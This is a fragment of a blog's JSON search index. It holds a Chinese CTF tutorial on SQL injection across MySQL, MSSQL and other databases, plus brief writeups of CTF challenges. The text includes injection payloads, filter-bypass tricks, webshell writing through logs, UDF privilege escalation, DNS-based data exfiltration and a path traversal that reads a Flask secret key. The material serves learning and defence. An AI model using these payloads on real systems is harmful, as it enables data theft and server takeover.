菜狗杯wp"},{"title":"看看sql注入","date":"2023-01-10T02:35:56.000Z","url":"/posts/35462.html","tags":[["SQL_Injection","/tags/SQL-Injection/"]],"categories":[["CTF Web","/categories/CTF-Web/"]],"content":"突然发现好久没写博客了，赶紧水一篇（雾） 三编 该文稍微总结一下我遇到过的sql注入（非常基础非常萌新，没学过的都能看得懂…吗？） SQL漏洞成因 程序没有对用户的输入进行过滤。 例如SQL的查询语句可能是： id和password是我们可输入的参数 在进行数据库查询时由于没有过滤单引号，我们输入1’和任意的密码时，语句会变成： 由于sql语法中单引号必须成对存在，所以这条查询语句中1’后面的单引号会和前面的单引号闭合，导致后面的单引号变得多余了，这条语句就会报错，一般报错的内容就是： 此时我们只需要将前面的单引号闭合，在后面插入我们想要查询的语句，就能够进行SQL的注入了 SQL注入点 挖掘sql注入的第一步就是要发现sql注入，只有发现了注入点才能够继续利用 所有和数据库有交互的地方都有可能存在sql注入，所以要根据数据包的发包情况，来关注可能那些数据会和数据库交互 首先看url 是否有?id=1这种，如果有的话有可能是SQL注入 然后就是给你一个框框，有可能是搜索用户名，也有可能是登录框，让你输入账号密码登录，也有可能是让你查询一段内容… 然后就是http头，包括user-agent，cookie，referer，xff(有些flask的也经常用X-Forwarded-For) 具体来说看一个发的包： 一些可能会和数据库交互的地方： 对于json格式的包，可以通过添加单双引号来破坏掉json格式： 具体做法就是添加单双引号 注入检测 输入特殊字符是否抛出异常 输入语句是否会返回预期的结果等 数据库识别 除了发现SQL注入的洞以外，你还要判断是哪种类型的数据库，不可能指望所有服务器都是mysql吧 一般来说可以利用数据库特有的函数来进行判断 或者是各种数据库的休眠函数 mysql 特有的注释符空格--空格 描述 语句 SLEEP函数 page.php?id=1'-SLEEP(1)=0 LIMIT 1 -- BENCHMARK函数 page.php?id=1'-BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds'))=0 LIMIT 1 -- 字符串连接(注意有个空格) page.php?id=' 'mysql' -- 或者page.php?id=' and concat('some','string') 版本信息 select @@version 或者select version() 错误消息(根据返回的错误信息判断) page.php?id=' 特有函数 select connection_id() select last_insert_id() select row_count() oracle 默认表 page.jsp?id='UNION SELECT 1 FROM v$version -- select banner FROM v$version select banner FROM v$version WHERE rownum=1 报错信息 page.jsp?id=' mssql mssql的特性也挺多的： 描述 语句 WAITFOR函数 page.asp?id=';WAITFOR DELAY '00:00:10'; -- 堆叠查询默认变量 page.asp?id=sql'; SELECT @@SERVERNAME -- 报错信息 page.asp?id=' 报错信息(利用@@SERVERNAME) page.asp?id=@@SERVERNAME 报错信息 page.asp?id=0/@@SERVERNAME 常量 @@pack_received或者@@rowcount postgreSQL/PGSQL 特殊sleep函数 page.jsp?id=' and (select pg_sleep_for('5 sec')) is null -- a 一些页面 一些端口 数据库特有函数 特殊符号 特殊表名 还可以根据特殊的报错banner信息来判断 SQL Injection | pentestmonkey (gm7.org) 虽然是生肉，但是里面有很多sql的trick SQL注入类型(?存疑) 分为字符型和数字型两种 判断方式也很简单： 虽然但是我这一步好像从来没判断过，直接加个单引号注入的… 所以有些不用加单引号的题就比较容易吃亏 Mysql 一些常用函数、注释符 一些常用的运算符，加减乘除取余那些就不说了 查看全局变量 几个可利用的函数 字符串截取操作函数 常用于盲注： 字符串拼接操作 常用的两个concat()，group_concat() 数据匹配操作 条件函数 其他 挑几个重要的，那些什么sleep，benchmark这些就不说了 流程：数据库 表名 列名 数据 如果没有想要的可以通过文件的读写操作来进一步检测，比如load_file，日志写shell这些 mysql注入手法 1.联合查询 非常常用的注入，适用于有回显位的注入（也就是会返回我们输入数据结果的位置） 首先判断字段数： 然后判断回显位： 爆库：（推荐使用-1，这是因为查询只会显示第一条结果，需要将union查询前面的内容置空） 首先查询database()、user()、version() version用于查看数据库版本 版本 手法说明 MySQL &lt; 5.0 小于5.0，由于缺乏系统库information_schema，故通常情况下，无法直接找到表，字段等信息，只能通过猜解的方式来解决 直接猜库名，表名，列名，再使用联合查询，当然也可以使用布尔注入来猜解 MySQL &gt;= 5.0 存在系统库information_schema，可直接查询到库名，表名，列名等信息 查询当前数据库名 查询所有数据库名 爆表： 爆列名： 爆内容： 当然也可以写成： 1.1 limit注入点 如果注入点在limit之后，想要判断字段数的时候可以利用into @,@的手法，其中@为mysql的临时变量 然后可以利用procedure analyse进行报错注入 2.报错注入 报错注入适用于没有回显位的，但是页面有报错信息的时候 2.1 group by 重复键冲 反正我是看不懂： 其实就是group_by + rand + floor 2.2 extractvalue() updated in 2023/3/11 extractvalue()的报错注入和updatexml还是有点不一样的： 2.3 updatexml() 与extractvalue()很相似，也是这三个里面最常用的： 注意报错注入只能回显前32个字符，爆flag时可能需要添加reverse函数： 2.4 exp、pow、溢出： version: 5.5.5 - 5.5.49 解释一下，这里是利用一层select user查询，把里面的结果取名为a 再利用select * from a将a取出 这里必须使用嵌套，因为不使用嵌套不加select from 无法大整数溢出。 2.5 name_const： 仅可获取version() 查询数据库版本： 2.6 uuid： 适用版本 8.0.x 2.7 join 利用重复查询相同表的方法来爆数据： sql语句： 搭配报错注入： 局限：必须要知道数据库跟表明的时候才能够利用join 2.8 gtid version &gt;=5.7 仅一列，可以查user、version、database 爆表名： 2.9 polygon等几何函数 前提需要知道字段名： 爆当前查询语句的库、表、字段： 函数 用法 GeometryCollection() GeometryCollection((select * from (select* from(select user())a)b)) polygon() polygon((select * from(select * from(select user())a)b)) multipoint() multipoint((select * from(select * from(select user())a)b)) multilinestring() multilinestring((select * from(select * from(select user())a)b)) linestring() linestring((select * from(select * from(select user())a)b)) multipolygon() multipolygon((select * from(select * from(select user())a)b)) 不常用，很少用 2.10 st相关函数 version&gt;=5.7 2.11 利用不存在的函数 可能会获得数据库的名称 2.12 BIG INT 当mysql数据库的某些边界数值进行运算的时候可能会产生报错 高版本已修 修复方法: 上waf，过滤掉能够造成报错注入的函数 万能预处理语句 不要在页面上 3.堆叠注入 在SQL中（以及在很多的地方中），分号表示命令的分隔，也就是SQL语句的结束，如果使用;后再在后面构造SQL语句，两条是可以一起执行的,例如： （此处可左转NewStarCTF week 3的multi SQL） 将id为1的密码更新为123456 使用条件： mysql能够执行多条语句的时候，例如： 爆库： 爆表： 爆列： 查看内容： 重命名： 如果update等被过滤，可以使用sql预处理语句进行拼接： 堆叠注入的绕过 分号的过滤可以利用\\G替代(待验证) 如果查询语句(select)这些一直被过滤，可以考虑利用十六进制： 此时就能执行我们的sql注入语句 盲注： 0xgame2023: 4.布尔盲注 适用于页面只有两种回显结果，没有任何错误回显 还有可能也是以下情况： HTTP状态响应码不同 响应头变化(比如302，或者设置了cookie) 报错(?) 4.1注入流程 闭合SQL语句 计算当前数据库名长度 逐字节获取数据库名 计算表的数量 计算表名的长度 逐字节获取表名 计算列的数量 计算列名的长度 逐字节获取列名 计算字段的数量 计算字段内容的长度 逐字节获取字段内容 常用的几个函数在盲注派上用场了：ascii substr这些 有的时候也可以使用异或符号（页面有1和0的时候） 直接用脚本跑就行了 4.1 常用绕过 left： left(str, length)，从左边开始截取长度为length的字符串，例如： 与之对应的还有right，但是right是从右边往左截取的： substring(str, index, length)，截取特定长度的字符串，相当于substr mid(str, index, length)，同substr strcmp()，比较字符串： 利用strcmp代替等号： between and也有类似的效果： 代替等号的还有in: jacko神的exp： like、regexp： regexp盲注： rlike也是等效的 like: 没有%时，like可以代替等号 在有%时，等效于regexp 绕过逗号 利用trim 4.2 基于报错的布尔盲注 exp：e的指数： 利用： 它会返回一个大数18446744073709551615 同时，如果我们的语句执行成功的话就会return 0 所以： 我们这样的话 就能够利用了： （转载）使用exp进行SQL报错注入 - lcamry - 博客园 (cnblogs.com) 同理，能报错的还有： cot(0) **pow()**乘方 4.3基于正则的盲注 regexp： 或者 再或者： 4.4 未知列明的盲注 在知道表明不知道列名的情况下，可利用： 类似这种方法进行匹配 5.时间盲注 延时注入，页面啥回显都没有的时候，我们需要观察页面的请求时间（ 编写脚本： 根据注入类型的不同，前面的查询需要修改的（ 过滤sleep： benchmark()，将表达式执行n次，我们可以利用重复执行多次表达式强行延长执行时间： 笛卡尔积 非常的耗时： 如果count被过滤，可以换成其他的函数如avg, min ,max, sum *如果被过滤，可以利用某一个字段代替： 如： 正则匹配，相当于新的sleep函数 例如： 数据库的第一个字是s的话就执行笛卡尔积 肉眼可见的卡，非常的耗时，以至于最后直接把服务干爆了。尽量少用这个 6.headers注入 就是利用上面的方式，换了个注入点… 例如user-agents（sqli-labs的less-18） cookies referer X-Forwarded-For 7.宽字节注入： 宽字节是多个字节宽度（&gt;1）的编码（GBK,gb2312…） 汉字就是宽字节编码 宽字节注入的成因： 数据库的编码和php的编码设置成了两个不同的编码，例如utf-8和gbk 此时如果利用addslashes转义，会使得我们多出一个\\ 要将反斜杠转义处理掉的方式有： 让（\\）失去作用 让（\\）的编码和另一个编码组合成两字节的编码（使得反斜杠消失） 第二种方法就是宽字节注入： 单引号的编码是%27 反斜杠的编码是%5c 所以我们只需要在单引号前加上%df，此时转义后的反斜杠(%5c)与%df就会组成一个汉字：運(运的繁体,%df%5c) 用户输入1%df' or 1=1# addslashes转义：1%df\\' or 1=1# gbk编码后：1運' or 1=1# 也就是： 这个时候查询语句就会变成： 剩下的只需要和联合查询一样的地方即可，在前面的单引号添加%df 在爆列名时： utf-8到latin1： 假设有个表里面是采用Latin1字符集的，此时只需要输入： ?username=admin%c2 %00-%7f能够直接表示某个字符 ，但是%c2-%f4只能表示长字符编码后结果的首字节 这些字节(%c2-%f4)在进行转换时会被直接抛弃 某次比赛的宽字节盲注： 8.二次注入 第一次注册等操作没有注入点，但是第二次操作代入了第一次操作的语句，导致sql注入（ 也就是说，我们提前构造好的语句成功储存进入数据库了，然后第二次操作（例如修改密码）中调用了第一次操作的语句，使得sql语句被执行 … 感觉好像还是没解释好，就是 第一次操作中，我们成功将sql语句储存入数据库中了 第二次操作中，数据库调用了该sql语句，导致sql语句被执行，形成二次注入(?) [RCTF2015] EasySQL 例如该题就是二次注入： 需要我们注册一个账户： 尝试注册一个叫1’的账户，注册成功，此处没有注入点 发现能修改密码，这种先注册再修改密码的操作很可能有二次注入 发现同样没有任何问题… 可能是单引号的问题，尝试换成双引号再注册一个用户 然后修改密码，发现报错： 说明是双引号型的二次注入，并且有报错，可以使用报错注入： 回显 invalid string，说明有过滤 可能是过滤了空格，所以我们使用括号替代空格： 发现还是回显invalid string 所以有可能也过滤了and，使用&amp;&amp;替代空格： 注册成功，然后修改密码 爆出库名web_sqli 注册用户 然后修改密码，爆出表名：article flag users 注册用户 然后修改密码，爆列名 注册用户 爆flag 发现flag并不在flag表内，回去看users表： 发现real_flag_1s_her 然后尝试 然后报错了… 没有这一列 突然才意识到报错注入有32个字符长度的限制， 尝试倒序查看列名： 果然，列名是real_flag_1s_here 然后爆flag： 发现很多xxx，列名内有很多xxx，占用了32个字符长度 regexp函数：正则匹配，返回特定字符串 flag的格式就是flag{xxx} 所以只需要匹配含有f的字符串即可 组合一下就行了，注意重复的地方 9.无列名注入 适用于information_schema表被过滤的情况 爆库名： 使用mysql.innodb_table_stats时，不储存列名 爆表名： 对列的处理： 先判断该表内有几列 然后给列都取一个名，然后读取这个名字的内容 判断列数： database.table为数据库名.表名 回显了多少个1就说明有几列 例如： 给列取名字读取： 比较法判断列数(?待验证) 10.insert注入 SQL语句： 此时构造语句 语句就会变成： xxxxx可以是报错注入的updatexml，也可以是时间盲注的语句，取决于你用何种注入方式： 11.update注入 无非就是闭合语句，再注入自己的语句，达到改密码等效果： 12.约束攻击 利用原理： 数据库中利用insert注册，利用select登录 insert语句只会截取表中最大字符限制的内容(比如设置了varchar(20)就只会保留20个) select语句输入什么就是什么 末尾的空格会被忽略掉 利用注册的时候加上特别多的空格insert进去，然后再登录： 假设我注册一个用户admin a insert时候只会截取前20个，变成admin .(15个空格) 这个时候就成功插入了admin账户的账号和密码了 文件操作 设置变量 全局变量 会话变量的设置 查看变量： 设置权限： secure_file_priv 限制文件的读、写。secure_file_priv只能够通过my.ini来配置，不能够通过sql语言进行修改 查看权限： null：不允许导入导出 /tmp：只允许在tmp下执行 空：无限制 读文件 读文件配合盲注： mysql写shell 写文件： 要知道web的绝对路径 web要有文件的写入权限 数据库有secure_file_priv设置 除了into outfile和into dumpfile以外，还有以下几种函数/语句可以写 lines terminated by：在每行终止的位置添加内容 对应的还有lines started by：在每行起始的位置添加 fields terminated by：可以理解成在每个字段处添加 columns terminated by：可以理解在每一列添加 sqlmap： 日志写shell： phpmyadmin里常见： 需要设置general_log和general_log_file 然后只需要select一下： 这样就把这条语句记录到日志里了，日志还是php，所以自然就有马了 但是还有问题，比如在windows下，设置secure_file_priv在C盘下，但是网站搭载在D盘的话，这样即使将general_log_file修改为C盘下的文件也是连不上的，除非有文件包含 这种方式的条件比较苛刻： 不能够union注入，因为写日志的时候需要set general_log_file，而union注入是不能够执行set的 要有堆叠注入(mysqli_multi_query)，不常见(常用mysqli_query) 或者你能够登入别的数据库或者phpmyadmin里 没有对单双引号进行过滤 慢查询日志写shell 在mysql&gt;5.6.34以后secure_file_priv的值默认为null。 mysql里有一种日志叫慢查询日志，它用于记录在mysql中响应时间超过阈值的语句，默认阈值(long_query_time)为10，时间超过这个参数的查询语句会被sql记录到慢查询日志中 使用慢查询主要针对日志量庞大，通过日志文件getshell出现问题的情况 如果查询的时候对敏感字符进行了过滤(如php)，可以利用CONCAT拼接或者REPLACE替换 各种表 information_schema 平时注入比较常用的表： 表 字段 说明 information_schema.schemata schema_name 库 information_schema.tables table_schema、table_name 库、表 information_schema.columns table_schema、table_name、column_name 库、表、列 sys 表 字段 说明 sys.innodb_buffer_stats_by_schema object_schema 库名 sys.innodb_buffer_stats_by_table object_schema、object_name 库名、表名 sys.io_global_by_file_by_bytes file 路径中包含表名 sys.io_global_by_file_by_latency file 路径中包含表名 sys.processlist current_statement、last_statement 当前数据库正在执行的语句、该句柄执行的上一条语句 sys.session current_statement、last_statement 当前数据库正在执行的语句、该句柄执行的上一条语句 sys.schema_auto_increment_columns table_schema、table_name、column_name 库名、表名、字段名 sys.schema_index_statistics table_schema、table_name 库名、表名 sys.schema_object_overview db 库名 sys.schema_table_statistics table_schema、table_name 库名、表名 sys.schema_table_statistics_with_buffer table_schema、table_name 库名、表名 sys.schema_tables_with_full_table_scans object_schema、object_name 库名、表名 sys.statement_analysis query、db 请求访问的数据库名、数据库最近执行的请求 sys.version mysql_version mysql版本信息 sys.x$innodb_buffer_stats_by_schema object_schema 库名 sys.x$innodb_buffer_stats_by_table object_schema、object_name 库名、表名 sys.x$io_global_by_file_by_bytes file 路径中包含表名 sys.x$schema_tables_with_full_table_scans object_schema、object_name 库名、表名 sys.x$schema_flattened_keys table_schema、table_name、index_columns 库名、表名、字段名 sys.x$ps_schema_table_statistics_io table_schema、table_name 库名、表名 performance_schema 只有库和表： 表 字段 说明 performance_schema.objects_summary_global_by_type object_schema、object_name 库、表 performance_schema.table_handles object_schema、object_name 库、表 performance_schema.table_io_waits_summary_by_index_usage object_schema、object_name 库、表 performance_schema.table_io_waits_summary_by_table object_schema、object_name 库、表 information_schema.TABLESPACES_EXTENSIONS 可以通过这个表去查询所有数据库中的数据库和表 mysql.innodb 无列名： 表 字段 说明 mysql.innodb_table_stats database_name、table_name 表名 mysql.innodb_index_stats database_name、table_name 引号逃逸 利用方式： 此处的xxx均为我们可控的内容，此时利用\\逃逸出username的一个单引号，在password处注入： quine(自等构造) 条件： 这里需要的是sql查询返回后的语句等于我们的password的语句 这里就可以利用replace函数替换，使其替换后的语句等于替换前的语句即可 对于返回值和输入值相同，并且输出自己的源代码程序，我们称之为Qunie 假设有个语句： 他经过处理后会变成： 仅相差中间那个B 此时利用char(66)，其实就是B，但是它不会被替换 此时变成了： 最后变成了： 但是此时又有了个新的问题，此时看到距离我们的最终目标就剩下了单双引号 那我们再次利用replace将单引号换成双引号： 比较套娃 此处实际上执行了两次replace： 第一次： 此处将该语句的双引号都换成了单引号 此时变成了： 最后的输出结果： 此时和语句1一致了 最后考虑到需要添加union select 空格/**/ 井号 最后的payload: 如果char被过滤，还可以利用十六进制编码： 方法2： 排序注入(order by) 讲到排序注入，就不得不说到mysql的一种防御方式叫预编译 预编译是啥呢，其实就是将一些灵活的参数值(可以理解成用户传的参数值)以占位符?的形式代替，然后让语句模板化。进行预编译之后sql语句就已经被分析优化了，并且是以参数化的形式来执行，所以即使有敏感字符，数据库也会当作属性值来处理而不是sql指令 预编译的形式通常是这样的： 或者一个更加普遍的形式： 此时我们输入1' or '1'='1时，预编译好的sql语句是这样的： '1' or '1'='1'(也就是再加上一个单引号) 此时就无法攻击了 那接下来说回排序注入 排序注入一般出现在order by： 这里拿sql-labs的lesson48来做测试就好了 挖掘思路 请求的参数中的关键词有order=，sort=，orderby=等 等于号后面有asc desc等 例如某接口： 这个接口是一个比较正常的get类型的获取数据接口 但是有一个orderby参数比较显眼 而且传递的参数值为pass_area_spot_id+desc，而desc是sql中的降序排序 发现orderby=pass_area_spot_id+desc与orderby=pass_area_spot_id+asc返回的数据不一致 检测方法 例如: AdminID+desc,exp(7)正常 而 AdminID+desc,exp(710)会溢出，导致响应时间过长： 基于时间的检测判断： 可见访问了3秒左右，代表存在该漏洞 利用方式 这个时候就可以利用了，建议条件为真时溢出(利于判断) 其实order by 后面可以直接添加sql语句 payload修改一下： 报错： 盲注(bool)： 这里也可以写基于二分的，如果正确页面回显正常，如果错误页面会回显Subquery returns more than 1 row(也有可能是别的) 如果直接order by sleep(2)的话会根据表内的数据，进行sleep(2n)的操作，导致查询时间过长 盲注(time)： 为什么预编译不能够防止order by导致的注入 其实这里可以换一个方法来问这个问题。 还记得预编译是什么吗？ 进行预编译之后sql语句就已经被分析优化了，并且是以参数化的形式来执行，所以即使有敏感字符，数据库也会当作属性值来处理而不是sql指令 那么这个问题就可以转化成order by为什么不能够被参数化执行了 说回order by，order by的语法一般是order by [字段名] [desc/asc] 如果对order by之后的输入进行参数化就会导致sql语句出错: 这个时候order by 后面的 xxx其实是一个字符串，而不是字段名，导致sql查询出错 引自原文： 那么为什么预编译的函数在参数化时非要把输入加上引号呢？如果没有引号不就可以防御order by注入了吗？是的，但确实没有不加引号的预编译的方法 那就是说引申一下，预编译防止不了order by导致的sql注入，也防御不了任何需要字符串并且不能够加引号的地方可能导致的sql注入 因为不能参数化的位置不管怎么拼接，最终都是和直接使用加号连接的方法一致 防御方式 既然预编译防不了group by，那要怎么防御呢？ 可以采取白名单的方式 因为order by 之后跟的字段名是有限的，而且肯定是数据库中已经存在的字段，所以只要对这些有限的字段设置白名单，其他的输入统一报错，那么就解决了 DNSLog 什么是DNSLog? DNS就是将域名解析为ip。用户在浏览器上输入一个A.com，就要靠DNS服务器将A.com解析到它的真实ip，这样就可以访问到该真实ip上的服务 如何利用DNSLog进行注入呢？ DNSLog回显原理 Internet采用层次树状结构命名方法，域是名字空间中的一个可被管理的划分。域还可以被分成子域，子域还能够再被划分，从右向左分别是顶级域名，二级域名，三级域名，如tieba.baidu.com，而且域名不分大小写 DNSLog的回显方式是这样的： 假设我ping %USERNAME%.a.com 此时回显的结果会是Ping 请求找不到主机 kang_.a.com 因为系统在ping之前先把%USERNAME%的值解析出来和a.com拼接起来 再和ping命令执行将kang_.a.com发给DNS服务器请求解析 这个过程被记录下来就称DNSLog 原理上只要能够进行DNS请求的函数都可能存在DNSLog注入 DNSLog能用在哪些地方？ SQL盲注。因为在sql注入的时候为布尔盲注、时间盲注的时候注入的效率低而且线程高的时候就容易被waf拦截，又或者目标站点无回显 无回显rce。这个不多说 无回显ssrf xss xxe 推荐的DNSLog网址：    DNSLog打SQL盲注 局限性：只能利用于windows并且有文件的读取权限，secure-file-priv不为null 这里就需要我们的load_file函数了，这个函数可以进行DNS请求。但是这个trick只适用于windows系统。因为windows上有一个叫UNC路径的东西 这是个什么玩意呢？ 其实是一个windows上的一个访问方式，其实就是我们的 这种反斜杠的访问方式 payload: 过程是这样的： 恶意sql注入传递到数据库执行database()函数，假设返回的数据库名字叫security 此时dns查询变成了security.xxx.ceye.io 然后带着这个查询去查询dns服务器(查询security.xxx.ceye.io) dns服务器返回了一个NS服务器地址xxx.ceye.io 向NS服务器查询security.xxx.ceye.io ND服务器上获取到了DNSLog，查询到了数据库的值 limit注入 注入点在limit后面 仅适用于5.x，因为procedure analyse在8.0.x已经被删除 group by 和limit的区别 group by 后可以直接跟sql注入语句，但是limit是不能直接跟的，需要再跟procedure analyse() 无order by的情况 后端语句可能长这样： 这种利用就很简单了，可以直接在后面加union，也可以利用procedure analyse() 有order by的情况 只能利用procedure analyse 查询语句的过滤 0.内联注释 不明觉厉() 可以将语句插入到注释中 1.大小写绕过： 2.编码： 进行url编码，如and（&amp;&amp;）可以尝试使用%26%26 如#可以使用%23 有些时候也可以利用hex： 3.空格绕过： 空格被过滤的一个方法： 另一个方法就是使用括号： 换用tab，%a0，%0a (我记得%a0也能绕过?) 测试过会发现and之前的空格可以被省略，而and后面的空格可利用数个~和!来绕过 还有+和- and后跟偶数个-即可 4.双写绕过： 将中间的union和select删除后又有union select，绕过成功 大抵是因为str_replace? 5.符号绕过： or 换成 || and 换成 &amp;&amp; 6.大小于号的过滤 万恶的大小于号过滤，在写脚本跑的时候非常痛苦 可以使用greatest()函数、least()函数 其实也可以直接使用等于号硬跑脚本，也就只用跑十七八分钟而已 7.过滤了database() updated in 2023/3/11 可以通过查一个不存在的表来爆出库名： 8.各种字符数字互转 ascii，常用于盲注，字符转ascii码 ord，等效替代ascii hex，传入字符或者十进制数返回十六进制 unhex，hex的反向 char，ascii、ord的反向 9.过滤了select 利用handler，常见于堆叠注入 条件：mysql8.0.19+ 使用了table和values 完全相等的时候返回null(?) 整数比较的时候是弱比较，注意 测试： 例如某sql注入有如下的waf： 查库： 也可以利用一个盲注，总之就是要知道database 总之就是一个脚本可以爆破 利用这种比较的方法可以比较出列名等 利用列比较： 查表： 查记录： 10. 绕过逗号 还是挺有用的 利用join绕过： limit情况下的： substr： 11. 绕过等于号 Payload 说明 &lt;&gt;、&gt;、&lt; 不等符、大于、小于 select 1 between 1 and 2; select 1 not between 1 and 2; between语句，在两值之间 select 1 in (1); select 1 not in (1); in语句，在集合中 select '123' like '1%'; like模糊匹配 select '123' regexp '^12.*'; regexp正则匹配 select '123' rlike '^12.*'; Rlike正则匹配 select regexp_like(&quot;abc&quot;,&quot;^ab&quot;); regexp_like函数正则匹配 12. and/or &amp;&amp; || ^ -sleep(2) 13. 小括号 一般利用regexp或者like 14. 注释符 直接完整闭合即可： 15. 绕过关键词 比如information_schema.tables这种一个大的关键词 可以利用空格或者反引号绕过 16. order by group by into @a, @b UDF提权 udf是一个用户自定义的函数 udf就是为了让开发者能够自己写方便自己的函数，udf有三种返回值：STRING，INTEGER，REAL udf创建自定义函数的格式： 例如自定义一个sys_eval函数： (主要是发现这个b mysql用户是特权用户，才能够用sudo) 需要条件 Windows 如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\\plugin\\文件夹下（windows下默认这个目录是不存在的，所以需要有权限创建） 如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\\windows\\system32目录，在windows server 2000下放置在c:\\winnt\\system32目录。 掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。 拥有可以将udf.dll写入相应目录的权限。 Linux 放到mysql安装目录的lib\\plugin\\即可 流程 首先要找到放plugin的路径 然后将so文件上传到这个路径 你要是有小马可以rce的可以用这个脚本打： 没有小马还是用sqlmap吧。。 php大🐎： msf： MSSQL 注释符 全局变量 常见函数 类型转换 字符串操作函数 字符串拼接 条件函数 同mysql 延时函数 常用语句 XP_CMDSHELL相关 注入手法 mssql的注入手法和mysql基本相似，但是mssql比mysql相对权限要更大 mssql靶场：   联合注入 一模一样 注意一下union和union all就是了 union：对两个结果集进行并操作，不包括重复行，同时进行默认规则的排序 union all：包括重复行，不进行排序 确认字段： 回显位： 需要用单引号括起来，如果直接用数字型的1 2 3 4，有些地方的类型会出现错误导致无法显示出来，建议使用'1'或者null 查询数据库权限和服务名： 这里如果是sysadmin就会回显1 查询数据库名和数据库用户： 查询其他数据库 爆表，利用database_name..sysobjects： database.information_schema.tables包含视图 database..sysobjects where xtype='U'只包含用户创建的表 查列名： 查值： 和mysql是差不多的，注意一些语句的差异即可 报错注入 服务器开启了报错信息返回（也就是报错的时候返回错误信息）的时候适用 mssql的报错注入常出现在类型转换错误的情况下，常用函数convert()、cast()、&gt; &lt; = 除法等数学运算 查询数据库： convert原本是将日期转化为新数据类型的函数 但是对于convert(int, db_name())，convert函数会线执行第二个参数的sql查询结果，再尝试进行转换。 但是由于db_name()查询的结果是VARCHAR型结果，无法转成int，就会导致转换错误，抛出错误信息 cast()也有类似的效果，它会将一种数据类型的表达式转换成另外一种类型： 除法： 在进行触发运算的时候，会尝试将db_name等参数转化为int，导致出错 &gt; &lt; =等比较运算也是这样的： 除此之外还有一些特别的： db_name(x) 报错原理是因为调用此函数的时候，它会将x转换为smallint类型，而查询出来的结果为nvarchar，因此会抛出异常： file_name(x) x具有int数据类型，同样地将nvarchar转int导致的出错 filegroup_name(x) col_name(table_id, column_id) objectname()、type_name()、schema_name()、SUSER_NAME()、USER_NAME()、PERMISSIONS() having 1=1爆表名 having需要和group by一起使用，若无group_by，则会直接爆出当前的表 group by having 1=1 爆列名 布尔盲注 与mysql流程一致 例如： 爆库： 查看数据库有多少表 查看第一张表的第一位： 时间盲注 利用mssql专用的睡眠函数WAITFOR DELAY '0:0:x' 实例： DNSLog fn_xe_file_target_read_file和fn_trace_gettable 限制就是需要控制服务器权限 堆叠注入 同mysql，mssql也支持多语句查询 order by 同mysql类似，也是出现在排序中，同样地mssql的order by也是不能够利用预编译进行修复的，原因同mysql（order by 跟的是字段名而不是字符串，如果预编译之后就会将字段名转换为字符串，就报错啦~ 修复方式和mysql是一样的，加白名单） 检测方式： 超大数抛异常： waitfor delay： 有报错的情况下可以直接通过报错注入来获取： 无报错的情况下利用时间盲注： 二次注入 同mysql 参考资料： sql注入详解 [RCTF2015]EasySQL 1 由order by排序注入实战引发的思考 - 简书 (jianshu.com) DNSlog注入学习 - Lushun - 博客园 (cnblogs.com) "},{"title":"NepNep x CatCTF    WriteUp","date":"2023-01-02T03:07:03.000Z","url":"/posts/22778.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF WriteUp","/categories/CTF-WriteUp/"]],"content":"又是被虐爆的一天，太难了 Misc MeowMeow 将图片拖入WinHex，会发现在文件的后半部分藏有flag Nepnep 祝你新年快乐啦 评论区置顶评论： CatchCat GPS Visualizer: Draw a map from a GPS data file 通过这个绘制出猫猫的行动路径，即可获取flag （为什么这玩意这么难看，这两个题都是考眼力的） Crypto Cat’s gift 将礼物分成了四份，说明结果需要乘4，其中一份是1-1/3+1/5-1/7+… 这个级数其实就是 （大抵是这样） 所以最后的值就是π（所以直接交pi是错的 看到flag的格式都是食物，所以应该是派 Web ez_js 直接进入**/js/game.js** 看到下面的函数： 访问/g3t_fl4g即可 ezbypass 华夏ERP漏洞之授权绕过漏洞+后台命令执行漏洞=未授权命令执行 | CN-SEC 中文网 参考这篇文章，可以绕过验证漏洞直接访问flag.html payload: /a.css/…/flag.html 或者**/login.html/…/flag.html** Catcat 蓝帽杯 2022 web/misc writeup - 腾讯云开发者社区-腾讯云 (tencent.com) 进入靶机，点击猫猫 可以看到url的变化，推测有目录穿越 尝试 成功，所以通过 查看当前进程，回显app.py 通过 获取到源码： 可以看到是flask（ 在/admin路由内，如果session的admin=1的话就会回显flag 而通过burp抓包访问/admin会回显set cookie: session… 所以应该是需要我们伪造一个session并且将设置的session修改掉 伪造session需要知道SECRET_KEY 这个思路在文章中有提及： 通过/proc/self/maps读取堆栈分布，然后通过/proc/self/mem读取内存分布，获取secretkey 这里使用thai大师傅的dump.py 先通过?file=../../../../../../../../proc/self/maps获取堆栈分布，将其内容复制并保存至source.txt 然后使用dump.py获取secretkey： 获取到secretkey后使用flask-session-cookie-manager即可 最后修改cookie即可 "},{"title":"Buuoj SSRF Me 题解","date":"2022-12-28T03:40:42.000Z","url":"/posts/6505.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF Web WriteUp","/categories/CTF-Web-WriteUp/"]],"content":"昨天做到的一个很好的题目（个人觉得），写出来给大家看看（ 打开靶机 打开靶机，直接看到源码，并且能够看到提示，flag在flag.txt内： 但是这源码也太恶心人了吧，这谁看得懂啊… 然后经过我不懈的努力（雾 把源码整理好了： 审代码 接下来慢慢对代码进行审计即可： 获取flag 整理一下大概就是如下的思路： 通过exec函数读取flag.txt的内容，而flag.txt的内容会被scan的action存储在result.txt中 我们只需要获得read方法读取即可： sign，action在/De1ta路由中由cookie传入，而param由get方法传入 所以我们需要先访问/geneSign路由，然后param=flag.txtread 返回一个值：(055967a25e4ba3f082a3ab94e0344994) 注：这个值随每次靶机打开都是不一样的 这个值就是flag.txtreadscan的sign值： 而我们传入的参数param，action又是flag.txt、readscan，完美符合sign值 然后使用bp抓包，添加cookie，修改url即可： 结束~ 另解：哈希长度拓展攻击 虽然但是我并不知道这个怎么用，在这里贴出大佬的wp吧（ De1CTF ssrf_me 的三种解法 - 先知社区 (aliyun.com) 略略水一篇博客没人骂我的吧~"},{"title":"Buuoj题目(3)","date":"2022-12-24T03:28:18.000Z","url":"/posts/46695.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF Web WriteUp","/categories/CTF-Web-WriteUp/"]],"content":"做做buuoj上的web题，本萌新纯采集，轻喷（（（ 没想到这个连续剧居然做到第三集了（？ [GWCTF 2019] 我有一个数据库 打开靶机，一眼乱码… 使用charset改编码： 好，那就用dirsearch开找，由于万恶的反爬，还是只能用低线程： 跑出了phpmyadmin和robots.txt 访问robots.txt 